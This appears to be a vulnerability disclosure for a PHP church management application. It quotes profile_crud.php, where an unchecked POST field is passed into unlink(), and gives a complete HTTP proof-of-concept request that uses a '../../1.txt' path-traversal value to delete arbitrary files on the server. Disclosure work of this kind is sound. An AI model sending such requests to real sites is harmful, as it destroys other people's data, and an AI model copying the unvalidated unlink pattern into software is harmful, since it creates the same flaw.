### Vulnerability file address

In line 31 of `church/admin/app/profile_crud.php`, `@unlink("../../assets/images/" . $_POST['old_cat_img']);`,` $_POST['old_cat_img']` parameters have not been restricted, which causes any file to be deleted

```php
<?php
session_start();
include '../../assets/constant/config.php';
error_reporting(0);
try {
	$conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
	$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
	echo "Connection failed: " . $e->getMessage();
}
if (isset($_POST['update'])) {

	$uploadDir = '../../assets/images/';
	if ($_FILES['image']['tmp_name'] != '') {
		$filepath = "../../assets/images/" . $_FILES["image"]["name"];
		$originalName = basename($_FILES['image']['name']);
		$extension = pathinfo($originalName, PATHINFO_EXTENSION);

		// Generate a new unique file name
		$newName = uniqid() . '.' . $extension;

		// Set the path to the new file location
		$newFilePath = $uploadDir . $newName;

		// Upload the file to the server


		if (move_uploaded_file($_FILES["image"]["tmp_name"], $filepath)) {
			$img = $_FILES["image"]["name"];

			@unlink("../../assets/images/" . $_POST['old_cat_img']);
		}
	} 
```

### POC

```http
POST /church/admin/app/profile_crud.php HTTP/1.1
Host: www.church.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=kecn6qqrggjnvlpgliqeq951j0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 362

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_cat_img"

../../1.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="image";filename="8881.php"

123
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--

```

### Attack results pictures

First, we create a `1.txt` file in the `church/` directory

![image-20250221162221120](/Users/xianyu123/Library/Application%20Support/typora-user-images/image-20250221162221120.png)



Then we execute the above poc to attack

![image-20250221162404923](https://raw.githubusercontent.com/nixuchuan/imgs/main/202502211624970.png)



Files are deleted after the attack is successful

![image-20250221162415917](https://raw.githubusercontent.com/nixuchuan/imgs/main/202502211624958.png)